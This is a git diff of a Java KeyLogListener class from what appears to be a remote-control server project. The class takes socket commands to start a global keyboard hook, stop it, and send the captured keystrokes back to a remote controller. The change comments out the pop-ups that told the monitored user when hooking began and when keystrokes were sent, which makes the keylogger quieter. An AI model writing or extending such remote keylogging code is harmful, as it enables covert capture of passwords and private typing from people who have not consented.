@@ -3,9 +3,10 @@ package controller;
 
 import com.github.kwhat.jnativehook.GlobalScreen;
 import com.github.kwhat.jnativehook.NativeHookException;
+import com.github.kwhat.jnativehook.dispatcher.SwingDispatchService;
 import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
 import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;
-
+import com.github.kwhat.jnativehook.GlobalScreen;
 import model.KeyLog;
 import Program.Server;
 
@@ -17,15 +18,15 @@ public class KeyLogListener {
 	
 	public KeyLog keyLog = new KeyLog();
 	
-	public KeyLogListener() {
+	public KeyLogListener() throws NativeHookException {
 		
-		
+		//GlobalScreen.setEventDispatcher(new SwingDispatchService());
 		
 		try {
 			
 			
 			String keyRequestLine;
-			String keyLogResult;
+			String keyLogResult = null;
 			
 			int count = 0;
 			
@@ -33,26 +34,32 @@ public class KeyLogListener {
 				keyRequestLine = Server.in.readLine();
 				if (keyRequestLine.equals("HOOK"))
 				{
-					JOptionPane.showMessageDialog(null, "Already hook!");
-					KeyLog.Keylogger(keyLog);
+					//JOptionPane.showMessageDialog(null, "Already hook!");
+					System.out.println("Bat dau KeyLog");
+					KeyLog.KeyLogger(keyLog);
+					
 				}
-				if (keyRequestLine.equals("UNHOOK"))
+				else if (keyRequestLine.equals("UNHOOK"))
+				{
+					JOptionPane.showMessageDialog(null, "Already unhook" + "!");
+					
+					System.out.println("Ket thuc Keylog:" + keyLogResult);
+					KeyLog.UnKeyLogger(keyLog);	
+					keyLogResult = keyLog.keylog;
+					
+				}
+				else if (keyRequestLine.equals("SHOW TEXT"))
 				{
 					
-					JOptionPane.showMessageDialog(null, "Already unhook" + "!");
-					KeyLog.UnKeyLogger(keyLog);					
-				}
-				if (keyRequestLine.equals("SHOW TEXT"))
-				{
-					keyLogResult = keyLog.keylog;
 					Server.out.write(keyLogResult);
 					Server.out.newLine();
 					Server.out.flush();
-					JOptionPane.showMessageDialog(null, "Already send!" +keyLogResult);
+					
+					//JOptionPane.showMessageDialog(null, "Already send!" );
 					keyLog.keylog = "";					
 				}
 				
-				if (keyRequestLine.equals("EXIT_KEYSTROKE"))
+				else if (keyRequestLine.equals("EXIT_KEYSTROKE"))
 				{
 					return;
 				}
